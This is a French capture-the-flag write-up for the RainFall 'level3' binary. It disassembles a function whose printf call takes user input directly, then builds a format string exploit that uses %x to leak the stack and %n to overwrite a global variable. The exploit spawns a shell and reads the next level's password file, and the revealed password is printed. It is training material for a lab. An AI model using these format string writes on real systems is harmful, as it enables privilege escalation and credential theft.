
# level3


## description
- Il y a un exécutable **level3**.Lorsqu'on l'exécute, il prends des caractères sur **stdin** puis l'affiche.

## Résolution

Avec gdb on peut voir une fonction **v** dans le main.

    Dump of assembler code for function v:
       0x080484a4 <+0>:     push   %ebp
       0x080484a5 <+1>:     mov    %esp,%ebp
       0x080484a7 <+3>:     sub    $0x218,%esp
       0x080484ad <+9>:     mov    0x8049860,%eax
       0x080484b2 <+14>:    mov    %eax,0x8(%esp)
       0x080484b6 <+18>:    movl   $0x200,0x4(%esp)
       0x080484be <+26>:    lea    -0x208(%ebp),%eax
       0x080484c4 <+32>:    mov    %eax,(%esp)
       0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
       0x080484cc <+40>:    lea    -0x208(%ebp),%eax
       0x080484d2 <+46>:    mov    %eax,(%esp)
       0x080484d5 <+49>:    call   0x8048390 <printf@plt>
       0x080484da <+54>:    mov    0x804988c,%eax
       0x080484df <+59>:    cmp    $0x40,%eax
       0x080484e2 <+62>:    jne    0x8048518 <v+116>
       0x080484e4 <+64>:    mov    0x8049880,%eax
       0x080484e9 <+69>:    mov    %eax,%edx
       0x080484eb <+71>:    mov    $0x8048600,%eax
       0x080484f0 <+76>:    mov    %edx,0xc(%esp)
       0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
       0x080484fc <+88>:    movl   $0x1,0x4(%esp)
       0x08048504 <+96>:    mov    %eax,(%esp)
       0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
       0x0804850c <+104>:   movl   $0x804860d,(%esp)
       0x08048513 <+111>:   call   0x80483c0 <system@plt>
       0x08048518 <+116>:   leave  
       0x08048519 <+117>:   ret    
    End of assembler dump.

On peut voir l'utilisation de **fgets** qui est protégé contre le buffer overflow. Il y a aussi un appel a **printf** qui est sensible au **format string exploit**.


     0x080484da <+54>:    mov    eax,ds:0x804988c
     0x080484df <+59>:    cmp    eax,0x40
Il y a une comparaison entre la variable **m** et **0x40**(64). Si la comparaison réussie alors ca utilise system pour lancer "/bin/sh".

     0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
     0x0804850c <+104>:   movl   $0x804860d,(%esp)
     0x08048513 <+111>:   call   0x80483c0 <system@plt>
Notre objectif va être de manipuler printf pour modifier la valeur de la variable m.

Tout d'abord on va afficher la mémoire jusqu'à ce qu'on atteigne la variable que l'on veux modifier. Avec le format **%x**, on peut  afficher l'adresse sur la stack.

    python -c 'print "aaaa %x %x %x %x %x %x %x %x %x %x"' > /tmp/exploit && cat /tmp/exploit | ./level3

    aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078
On vois que notre version est a la **4e** position(61 = a en hexa)
Maintenant, on peut changer l'adresse par l'adresse de la variable m.

    level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"' > /tmp/exploit && cat /tmp/exploit | ./level3
    � 200 b7fd1ac0 b7ff37d0 804988c
L'adresse a bien changé.

Il faut changer la valeur de la variable **m**(qui est a 0 initialement). Pour cela on va utiliser le format **%n**. ca va nous permettre d'écrire un nombre de bytes à l'adresse donnée.

    python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit && cat /tmp/exploit - | ./level3 

On a réussi.

    Wait what?!
    whoami
    level4
    cat /home/user/level4/.pass
    b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
